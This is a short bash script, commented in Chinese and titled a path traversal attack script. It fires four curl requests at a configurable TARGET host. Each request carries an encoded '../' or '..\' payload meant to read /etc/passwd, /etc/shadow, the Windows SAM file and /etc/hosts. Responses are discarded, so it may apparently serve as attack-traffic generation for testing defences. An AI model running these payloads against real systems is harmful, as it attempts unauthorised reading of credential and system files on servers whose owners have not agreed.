#!/bin/bash
# 路径遍历攻击脚本
# 用法: TARGET=127.0.0.1:8080 ./path_traversal.sh

TARGET="${TARGET:-127.0.0.1:8080}"
echo "[路径遍历] 开始攻击 $TARGET ..."
sleep 1

echo "  [1/4] ../../../etc/passwd"
curl -s "http://$TARGET/download?file=..%2F..%2F..%2Fetc%2Fpasswd" > /dev/null
sleep 0.3

echo "  [2/4] ..\\..\\..\\ (Windows格式)"
curl -s "http://$TARGET/download?file=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam" > /dev/null
sleep 0.3

echo "  [3/4] 多层 ../ (省略式)"
curl -s "http://$TARGET/download?file=....%2F%2F....%2F%2F....%2F%2Fetc%2Fshadow" > /dev/null
sleep 0.3

echo "  [4/4] JSON 路径注入"
curl -s "http://$TARGET/api/export?path=..%2F..%2F..%2Fetc%2Fhosts" > /dev/null
sleep 0.3

echo "[路径遍历] 完成 (4 次攻击)"
